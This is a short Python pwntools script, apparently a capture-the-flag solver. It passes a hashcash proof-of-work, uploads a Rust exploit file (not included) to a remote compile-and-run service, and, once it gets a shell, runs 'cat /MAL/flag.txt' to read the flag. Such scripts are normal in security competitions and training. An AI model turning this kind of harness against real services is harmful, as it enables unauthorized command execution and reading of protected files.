from __future__ import division, print_function
import random
from pwn import *
from subprocess import *
from os import environ
context.log_level = logging.WARN

log = False
is_gaibu = True
if is_gaibu:
    host = environ['HOST']
    port = environ['PORT']
else:
    host = "127.0.0.1"
    port = 3001

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

def main():
    with open("build/solver/solve.rs", "r") as f:
        solve_rs = f.read()

    recvuntil('generated by `hashcash -mb26 ')
    s = recvuntil('`').strip('`')
    s = check_output(['hashcash', '-mb26', s])
    sendline(s)

    recvuntil('input your source code size')
    sendline(str(len(solve_rs)))
    sendline(solve_rs)
    recvuntil('target/debug/temp')
    sendline('echo hogefuge')
    recvuntil('hogefuge\n')
    sendline('cat /MAL/flag.txt')
    print(r.recvline().strip())
    r.close()
main()
